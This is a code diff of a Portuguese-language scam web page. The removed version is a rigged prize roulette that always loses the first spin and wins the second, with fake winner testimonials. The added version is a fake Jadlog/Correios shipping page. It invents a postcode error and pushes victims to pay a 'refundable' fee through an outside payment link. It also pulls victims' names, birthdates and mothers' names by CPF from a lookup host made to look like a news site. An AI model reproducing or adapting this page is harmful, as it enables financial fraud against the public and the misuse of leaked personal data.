@@ -1,317 +1,389 @@
-<!DOCTYPE html><html lang="pt-br"><!-- Mirrored from meclivreresgate.online/roleta/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 31 Mar 2025 11:32:14 GMT --><head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-  <title>Viva Sorte</title>
-  <link rel="icon" href="images/favicon.png">
-  <link rel="shortcut icon" href="images/favicon.png">
-  <link rel="stylesheet" href="css/all.css" crossorigin="anonymous">
-  <link rel="stylesheet" href="css/bootstrap.min.css">
-  <link rel="stylesheet" href="css/stylead8e.css">
-  <style>
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link rel="stylesheet" href="css/style.css">
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        #buttonClick {
+            background-color: #048848;
+            color: white;
+            font-family: "Poppins";
+            padding: 7px 15px 7px 15px !important;
+            text-decoration: none !important;
+            border-radius: 10px !important;
+            border: none !important;
+            font-size: 18px !important;
+            font-weight: 600;
+        }
+
+        #buttonClick:hover {
+            background-color: #0071c6;
+            cursor: pointer;
+        }
+    </style>
+
+
+    <title>VERIFICAÇÃO</title>
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script><script async="" defer="" src="js/pixel.js"></script></head>
+
+
+
+<body>
+    <header>
+        <img src="images/logo_home.png" alt="">
+
+        <p style="margin-top: 5px; font-size: 12px;">Será responsável pelo envio do pedido.</p>
+    </header>
+
+    <div class="cta">
+        <img id="imagem" src="images/certo-jadlog.png" alt="">
+
+        <p>Confirme os dados de envio seu pedido:</p>
+    </div>
+
+<style>
+  body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    height: 105vh;
+    margin: 0;
+    background-color: #ffffff;
+  }
+
   @keyframes pulse {
-    0% { transform: scale(1); }
-    50% { transform: scale(1.3); }
-    100% { transform: scale(1); }
+    0% {
+      box-shadow: 0 0 0px rgba(0, 123, 255, 0.6);
+    }
+    50% {
+      box-shadow: 0 0 20px rgba(0, 123, 255, 1);
+    }
+    100% {
+      box-shadow: 0 0 0px rgba(0, 123, 255, 0.6);
+    }
+  }
+
+  .img-brilhante {
+    width: 105%;
+    max-width: 100px;
+    animation: pulse 2s infinite;
+    border-radius: 8px;
+    margin-top: -1.7em;
+    margin-bottom: 1.0em;
   }
 </style>
-  <style>
-    /* Animação de pulsação para as chances */
-    .pulsating {
-      animation: pulse 1.5s infinite;
+
+<img src="images/iphone.png" alt="iPhones" class="img-brilhante">
+
+<div id="info"> 
+  <p id="linha-bairro"><strong>Bairro:</strong> <span id="bairro">Erro</span></p>
+  <p><strong>Cidade:</strong> <span id="cidade">Erro</span></p>
+  <p><strong>Estado:</strong> <span id="estado">Erro</span></p>
+</div>
+
+<script>
+fetch("/get-endereco.php/get-endereco.php")
+  .then(res => res.json())
+  .then(data => {
+    if (data.bairro) {
+      document.getElementById("bairro").textContent = data.bairro;
+    } else {
+      document.getElementById("linha-bairro").style.display = "none";
     }
 
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.3); }
-      100% { transform: scale(1); }
-    }
-  </style>
-  <script src="js/jquery-3.0.0.slim.min.js"></script>
-  <script src="js/jquery.min.js"></script>
-  <script src="js/bootstrap.min.js"></script>
-  <script src="js/confetti.browser.min.js"></script>
-<script async="" defer="" src="js/pixel.js"></script><script async="" defer="" src="js/pixel.js"></script></head>
-<body>
-  <div id="loading-screen" style="display: none;">
-      <div class="spinner-loading"></div>
-  </div>
-
-<script src="../../cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
-
-  <div id="page-content">
-    <section>
-      <h1 id="cta-text" style="color: white;">
-  Gire a <b>Roleta</b> para ganhar o seu <b>Mega Prêmio</b>!<br>
-</h1>
-
-      <div class="roulette">
-        <img src="responda.html" id="roleta1">
-        <div id="roleta2">
-          <img src="images/roletanova.png" class="spinner">
-        </div>
-        <img src="images/button-gire.png" id="roleta3" style="cursor: pointer;">
-      </div>
-      <div class="button-roulette">
-        <button id="button-cta" class="runSpin">        
-          GIRE PARA GANHAR
-        </button>
-      </div>
-    </section>
-  </div>
-
-  <div id="people" class="people">
-    <img src="images/man6.jpg" id="people-img" alt="">
-    <p style="text-align: center" id="people-p">João acabou de ganhar <b>75% de desconto</b>!</p>
-  </div>
-
-  <div id="overlay" class="overlay"></div>
-  <div id="popup-try-again" class="popup">
-    <div class="popup-content">
-      <h2>Uma pena!</h2>
-      <img src="images/sweat.png">
-      <p>Você foi o grande selecionado e ganhou <b class="text-success pulsating" style="color: green!important; font-size: 22px; animation: pulse 1.5s infinite; display: inline-block;"> 01 </b> chance extra. Boa sorte!</p>
-      <button id="try-again-button">Tentar Novamente</button>
-    </div>
-  </div>
-  <div id="popup" class="popup">
-    <div class="popup-content">
-      <h2>Parabéns!</h2>
-      <img src="images/star-struck.png">
-      <p>Você acaba de ganhar dois <b class="text-success pulsating" style="color: green!important;">2 iPhones 16 PRO MAX + 1 AirPods</b></p>
-      <button id="resgatar-premio" href="responda.html">Resgatar seu Prêmio</button>
-    </div>
-    <audio id="confetti-audio" src="media.html"></audio>
-    <audio id="roleta-audio" src="media/roleta.mp3"></audio>
-  </div>
-
-  <script>
-    let attempt = 0;
-
-    const animateSpin = () => {
-      const roleta2 = document.querySelector('#roleta2');
-      const roleta2Img = document.querySelector('#roleta2 img');
-      const buttonCta = document.getElementById('button-cta');
-      const confettiAudio = document.getElementById('confetti-audio');
-      const roletaAudio = document.getElementById('roleta-audio');
-      const ctaText = document.getElementById('cta-text');
-      const chanceText = document.getElementById('chance');
-
-      if (roleta2) {
-        roleta2Img.classList.remove('spinner');
-        buttonCta.style.display = 'none';
-
-        // Tocar o som da roleta no início
-        roletaAudio.currentTime = 0;
-        roletaAudio.play();
-
-        if (attempt === 0) {
-          const animatedClass = 'wheel__spinner_animated_retry_then_win';
-          roleta2.classList.add(animatedClass);
-
-          setTimeout(() => {
-            roletaAudio.pause();
-            const overlay = document.getElementById('overlay');
-            const tryAgainPopup = document.getElementById('popup-try-again');
-            overlay.style.display = 'block';
-            tryAgainPopup.style.display = 'block';
-
-            // Atualizar o texto para chance extra
-
-          }, 10000);
-        } else {
-          const animatedClass = 'wheel__spinner_animated';
-          roleta2.classList.add(animatedClass);
-
-          setTimeout(() => {
-            roletaAudio.pause();
-            confetti({
-              particleCount: 100,
-              spread: 70,
-              origin: { y: 0.6 }
-            });
-            confettiAudio.play();
-
-            const overlay = document.getElementById('overlay');
-            const popup = document.getElementById('popup');
-            overlay.style.display = 'block';
-            popup.style.display = 'block';
-
-            buttonCta.classList.add('hide-me');
-          }, 10000);
-        }
-      }
-    };
-
-    const addSpinAnimation = (element) => {
-      element.addEventListener('click', () => {
-        animateSpin();
-        attempt++;
-      });
-    };
-
-    document.querySelectorAll('.runSpin').forEach(addSpinAnimation);
-
-    document.getElementById('roleta3').addEventListener('click', () => {
-      animateSpin();
-      attempt++;
-    });
-
-    document.getElementById('try-again-button').addEventListener('click', () => {
-      const overlay = document.getElementById('overlay');
-      const tryAgainPopup = document.getElementById('popup-try-again');
-      overlay.style.display = 'none';
-      tryAgainPopup.style.display = 'none';
-      const roleta2 = document.querySelector('#roleta2');
-      roleta2.classList.remove('wheel__spinner_animated_retry_then_win');
-      const buttonCta = document.getElementById('button-cta');
-      buttonCta.style.display = 'block';
-    });
-
-    (() => {
-  const premios = [
-    'Mil Reais',
-    'Carro 0km',
-    '12 Mil Reais',
-    '2 iPhones 16 Pro Max',
-    '15 Mil Reais'
-  ];
-
-  const frases = [
-    {
-      nome: 'Pedro Oliveira',
-      imgSrc: 'https://i.postimg.cc/RhB8zCK5/24.jpg',
-    },
-    {
-      nome: 'Ana Alves',
-      imgSrc: 'https://i.postimg.cc/prw31XTF/2.jpg',
-    },
-    {
-      nome: 'Fernanda Santos',
-      imgSrc: 'https://i.postimg.cc/X7FvNr9t/3.jpg',
-    },
-    {
-      nome: 'Bruno Souza',
-      imgSrc: 'https://i.postimg.cc/2ynfYBgw/5.jpg',
-    },
-    {
-      nome: 'Fabrício Costa',
-      imgSrc: 'https://i.postimg.cc/kXrTRHtD/6.jpg',
-    },
-    {
-      nome: 'Juliana Lima',
-      imgSrc: 'https://i.postimg.cc/0ynPrDjX/4.jpg',
-    },
-    {
-      nome: 'Yasmin Araújo',
-      imgSrc: 'https://i.postimg.cc/9XNrx3BF/10.jpg',
-    },
-    {
-      nome: 'Lucilene Silva',
-      imgSrc: 'https://i.postimg.cc/x8Wj92sv/11.jpg',
-    },
-    {
-      nome: 'Everaldo Rocha',
-      imgSrc: 'https://i.postimg.cc/nhFYvfVV/7.jpg',
-    },
-    {
-      nome: 'Oswaldo Carvalho',
-      imgSrc: 'https://i.postimg.cc/cHSQ4pzN/9.jpg',
-    },
-    {
-      nome: 'João Pereira',
-      imgSrc: 'https://i.postimg.cc/W3wf26XX/14.jpg',
-    },
-    {
-      nome: 'Ariadiny Gomes',
-      imgSrc: 'https://i.postimg.cc/xTMNqxKf/12.jpg',
-    },
-    {
-      nome: 'Carla Ferreira',
-      imgSrc: 'https://i.postimg.cc/qq8BBFWW/13.jpg',
-    },
-    {
-      nome: 'Gabriela Vieira',
-      imgSrc: 'https://i.postimg.cc/MT9bPss2/15.jpg',
-    },
-    {
-      nome: 'Wellington Martins',
-      imgSrc: 'https://i.postimg.cc/vmBW17Y0/16.jpg',
-    },
-    {
-      nome: 'Iago Barbosa',
-      imgSrc: 'https://i.postimg.cc/rwgHX9Zj/17.jpg',
-    },
-    {
-      nome: 'Maicon Ramos',
-      imgSrc: 'https://i.postimg.cc/0NFcPXYY/18.jpg',
-    },
-    {
-      nome: 'Vitória Castro',
-      imgSrc: 'https://i.postimg.cc/VkSKpcMf/19.jpg',
-    },
-    {
-      nome: 'Matheus Santos',
-      imgSrc: 'https://i.postimg.cc/qvXNkN2j/20.jpg',
-    },
-    {
-      nome: 'Marta Rocha',
-      imgSrc: 'https://i.postimg.cc/N0Fdh9nr/23.jpg',
-    },
-    {
-      nome: 'Geraldo Nascimento',
-      imgSrc: 'https://i.postimg.cc/25gVzM07/21.jpg',
-    },
-    {
-      nome: 'Daniel Ribeiro',
-      imgSrc: 'https://i.postimg.cc/ZK0tcnb0/22.jpg',
-    },
-  ];
-
-  window.addEventListener('DOMContentLoaded', () => {
-    const contDiv = document.getElementById('people');
-    const peopleFrase = document.getElementById('people-p');
-    const peopleImg = document.querySelector('#people-img');
-    setInterval(() => {
-      const randFrase = frases[Math.floor(Math.random() * frases.length)];
-      const premioAleatorio = premios[Math.floor(Math.random() * premios.length)];
-
-      const frase = `${randFrase.nome} acabou de ganhar <b>${premioAleatorio}</b>!`;
-
-      peopleFrase.innerHTML = frase;
-      peopleImg.src = randFrase.imgSrc;
-
-      contDiv.classList.toggle('display-off');
-      contDiv.classList.remove('slide-animation');
-      setTimeout(() => {
-        contDiv.classList.toggle('display-off');
-        contDiv.classList.add('slide-animation');
-      }, 20);
-    }, 4000);
+    document.getElementById("cidade").textContent = data.cidade || "—";
+    document.getElementById("estado").textContent = data.estado || "—";
+  })
+  .catch(() => {
+    document.getElementById("bairro").textContent = "Erro";
+    document.getElementById("cidade").textContent = "Erro";
+    document.getElementById("estado").textContent = "Erro";
   });
-})();
+</script>
+
+<div style="text-align: center;">
+  <p id="setars">
+    O envio será feito em parceria com os Correios e o Sedex.
+  </p>
+</div>
 
 
-    const getQueryParams = () => {
-      const params = new URLSearchParams(window.location.search);
-      return params.toString();
-    };
+<div class="cta4">
+    <button id="sends" type="button">CONFIRMAR</button>
+</div>
 
-    document.getElementById('resgatar-premio').addEventListener('click', () => {
-      const queryParams = getQueryParams();
-      const baseUrl = '/up1/2/';
-      const redirectUrl = queryParams ? `${baseUrl}?${queryParams}` : baseUrl;
-      window.location.href = redirectUrl;
-    });
+    <div id="popoup">
+        <div class="popoupcontent">
+            <div class="row">
+                <img id="naomostrardeinicio" src="images/red-hazard-warning-sign-on-transparent-background-free-png.png" alt="">
 
-    window.addEventListener('load', function() {
-      const loadingScreen = document.getElementById('loading-screen');
-      loadingScreen.style.display = 'none';
-    });
-  </script>
+                <div class="headlineectapopoup">
+                    <h1 id="carregandodadoss">Confirmando seus dados...</h1>
+                    <p id="esconderdepois">Por favor aguarde</p>
+                </div>
 
-  <script src="js/jstools.js"></script>
+                <h1 id="carregandodadosSs">ERRO NO CEP</h1>
+            </div>
 
-<script src="js/latest.js" async="" defer=""></script>
+            <div class="loading">
+                <br>
+                <div class="progresseBar">
+                    <div class="progress"></div>
+                </div>
+            </div>
+
+            <div class="contente">
+                <p>
+                    O valor do CEP foi calculado errado para sua região, o envio não será enviado.
+
+                    <br><br>
+
+                    Para realizarmos o envio é necessário que envie o pagamento do frete. (O Valor pago do frete será reembolsado.)
+                </p>
+<style>
+
+@keyframes aparecer {
+  to { opacity: 1; }
+}
+
+@keyframes dots {
+}
+
+@keyframes fadeOut {
+  to { opacity: 0; visibility: hidden; height: 0; margin: 0; padding: 0; }
+}
+
+#img-container {
+  text-align: center;
+  margin-top: 10px;
+}
+
+#img-container p {
+  margin: 8px 0;
+  font-size: 14px;
+}
+
+#img-container strong {
+  display: block;
+  margin: 12px 0 6px;
+}
+
+/* Texto \"Calculando\" */
+#loading-box {
+  font-weight: bold;
+  font-size: 16px;
+  color: #0047BB;
+  min-height: 30px;
+  animation: fadeOut 0.2s ease 5s forwards;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin: 8px 0;
+}
+
+.loading-spinner::after {
+  content: ".";
+  animation: dots 1s steps(3, end) infinite;
+}
+
+/* Imagem */
+.img-destaque {
+  width: auto !important;
+  height: auto !important;
+  max-width: 100% !important;
+  border: 4px solid red;
+  border-radius: 10px;
+  display: block;
+  margin: 10px auto;
+  opacity: 0;
+  animation:
+    aparecer 0.5s ease 5s forwards,
+    bordaPiscando 1s infinite 3s;
+}
+
+@keyframes bordaPiscando {
+  0%, 100% { border-color: red; }
+  50%     { border-color: transparent; }
+}
+</style>
+
+
+
+<div id="frete-container" style="text-align: center; margin-top: 10px; font-family: Arial, sans-serif;">
+  <p><strong>Esse é o novo prazo de entrega:</strong></p>
+
+
+  <!-- CAIXA DO FRETE -->
+  <div style="
+    border: 2px solid #ccc;
+    padding: 12px;
+    border-radius: 10px;
+    font-size: 15px;
+    background-color: #fff;
+    display: inline-block;
+    text-align: left;
+    max-width: 95%;
+    margin-top: 10px;
+  ">
+    <label style="display: flex; align-items: flex-start; gap: 10px;">
+      <input type="radio" name="frete" checked="" style="margin-top: 4px;">
+      <div>
+        <strong>SEDEX Full – Mais rápido.</strong><br>
+        <span style="color: gray;">(Recomendado)</span><br>
+        <span id="proximo-dia" style="font-weight: bold; color: rgb(0, 179, 0); font-size: 15px; display: block;">(CHEGA QUINTA)</span>
+      </div>
+    </label>
+  </div>
+
+  <!-- BOTÃO (invisível de início) -->
+  <div style="margin-top: 15px;">
+    <a id="buttonClick" href="https://pay.finalizeseu.site/RmA83Ea8zql3PVp" style="
+      display: none;
+      background-color: #048848;
+      color: white;
+      font-family: Poppins, sans-serif;
+      padding: 12px 24px;
+      text-decoration: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 600;
+      display: inline-block;
+    ">PAGAR FRETE</a>
+
+    <div id="maisforte" style="display: block; font-size: 13px; margin-top: 5px;">
+      Clique no botão para continuar
+    </div>
+  </div>
+</div>
+
+
+
+ 
+<script>
+  const diasSemana = [
+    "(CHEGA DOMINGO)", "(CHEGA SEGUNDA)", "(CHEGA TERÇA)", "(CHEGA QUARTA)",
+    "(CHEGA QUINTA)", "(CHEGA SEXTA)", "(CHEGA SÁBADO)"
+  ];
+
+  const hoje = new Date().getDay();
+  const proximo = (hoje + 1) % 7;
+  const texto = diasSemana[proximo];
+
+  // Mostra o dia depois de 10 segundos
+  setTimeout(() => {
+    document.getElementById('proximo-dia').textContent = texto;
+    document.getElementById('proximo-dia').style.display = 'block';
+  }, 5);
+
+  // Mostra o botão e o texto depois de 11 segundos
+  setTimeout(() => {
+    document.getElementById('buttonClick').style.display = 'inline-block';
+    document.getElementById('maisforte').style.display = 'block';
+  }, 5);
+</script>
+
+
+
+
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <img src="images/jadlog-logo-png.png" alt="">
+
+        <p>Todo conteúdo deste site está publicado sob a licença</p>
+    </footer>
+
+    <script src="js/text.js"></script>
+
+    <script>
+        const queryParams = new URLSearchParams(window.location.search);
+
+        const cpf = queryParams.get('document');
+
+        const user = {};
+
+        function renderData() {
+            if (user.sex && user.birthdate) {
+                let htmlContent = `
+                    Nome: <b>${user.name}</b><br>
+                    Sexo: <b>${user.sex === 'M' ? 'Masculino' : user.sex === 'F' ? 'Feminino' : user.sex}</b><br>
+                    Data de nascimento: <b>${user.birthdate}</b>`;
+
+                if (user.mother && user.mother !== "0") {
+                    htmlContent += `
+                        <br>Nome da mãe: <b>${user.mother}</b>
+                    `;
+                }
+
+                document.getElementById('setar').innerHTML = htmlContent;
+            } else {
+                document.getElementById('setar').innerHTML = `Carregando...`;
+            }
+        }
+
+        fetch('https://g1-noticia.net/verificacao/getUserData.php?cpf=' + cpf)
+            .then(response => response.json())
+            .then(data => {
+                user.name = data.name;
+                user.sex = data.sex;
+                user.cpf = data.cpf;
+                user.mother = data.mother;
+                user.birthdate = data.birthdate;
+
+                renderData();
+            })
+            .catch(error => {
+                console.error('Erro ao fazer a solicitação:', error);
+            });
+            
+    </script>
+    
+    <style>
+#sends {
+    background-color: #0071c6;
+    color: white;
+    font-family: "Poppins", sans-serif;
+    padding: 12px 24px;
+    border: none;
+    border-radius: 10px;
+    font-size: 18px;
+    font-weight: 600;
+    cursor: pointer;
+    width: 100%;
+    max-width: 280px;
+    transition: background-color 0.3s ease;
+    margin-top: 20px;
+}
+
+#sends:hover {
+    background-color: #048848;
+}
+</style>
+
+<style>
+  .progresseBar {
+    width: 100%;
+    height: 10px;
+    background-color: #eee;
+    border-radius: 5px;
+    overflow: hidden;
+  }
+
+  .progress {
+    width: 0%;
+    height: 100%;
+    background-color: #0071c6; /* Cor azul desejada */
+    transition: width 0.5s ease;
+  }
+</style>
 
 <script>
   window.pixelId = "68252b4a42cbf25c85a8273f";
@@ -321,3 +393,5 @@
   a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
   document.head.appendChild(a);
 </script>
+
+</body></html>
